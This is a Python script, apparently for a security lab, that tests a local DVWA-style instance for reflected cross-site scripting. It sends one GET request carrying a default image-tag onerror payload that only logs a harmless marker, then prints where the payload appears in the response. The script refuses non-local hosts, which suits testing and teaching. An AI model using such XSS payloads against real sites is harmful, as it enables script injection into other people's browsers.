#!/usr/bin/env python3
'''XSS-003 reflected-XSS verification draft (harmless marker only).

Sends one GET request to a local lab instance and prints the reflected
region. A browser must still be opened manually to observe execution.
'''
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {'localhost', '127.0.0.1', '::1'}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def main() -> int:
    parser = argparse.ArgumentParser(description='XSS-003 local reflection check')
    parser.add_argument('--base', required=True, help='e.g. http://127.0.0.1/dvwa')
    parser.add_argument('--path', required=True, help='e.g. /vulnerabilities/xss_r/')
    parser.add_argument('--param', default='name')
    parser.add_argument(
        '--payload',
        default='<img src=x onerror="console.log(\'LLM_LAB_XSS\')">',
    )
    parser.add_argument('--cookie', default=None, help='optional PHPSESSID=... (never commit)')
    parser.add_argument('--security', default=None, help='optional DVWA security cookie value')
    parser.add_argument('--timeout', type=float, default=10.0)
    args = parser.parse_args()

    target = urllib.parse.urlsplit(args.base)
    if target.scheme not in ('http', 'https') or target.hostname not in ALLOWED_HOSTS:
        print('refusing non-local target', file=sys.stderr)
        return 2

    url = args.base.rstrip('/') + args.path
    query = urllib.parse.urlencode({args.param: args.payload})
    sep = '&' if '?' in url else '?'
    request = urllib.request.Request(url + sep + query, method='GET')
    request.add_header('User-Agent', 'xss003-lab-check/1.0')
    cookie = args.cookie
    if args.security:
        cookie = (cookie + '; ' if cookie else '') + 'security=' + args.security
    if cookie:
        request.add_header('Cookie', cookie)

    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(request, timeout=args.timeout) as response:
            body = response.read().decode('utf-8', 'replace')
            print('status:', response.status)
            print('content-type:', response.headers.get('Content-Type'))
    except urllib.error.HTTPError as exc:
        print('http error:', exc.code, 'location:', exc.headers.get('Location'), file=sys.stderr)
        return 3
    except urllib.error.URLError as exc:
        print('connection error:', exc.reason, file=sys.stderr)
        return 4

    index = body.find(args.payload)
    if index == -1:
        print('marker not reflected verbatim; check login, security level and page path', file=sys.stderr)
        return 5
    print('marker reflected at offset', index)
    print(body[max(0, index - 120):index + len(args.payload) + 120])
    print('NOTE: reflection shown in HTTP only; browser execution needs manual observation.')
    return 0


if __name__ == '__main__':
    sys.exit(main())
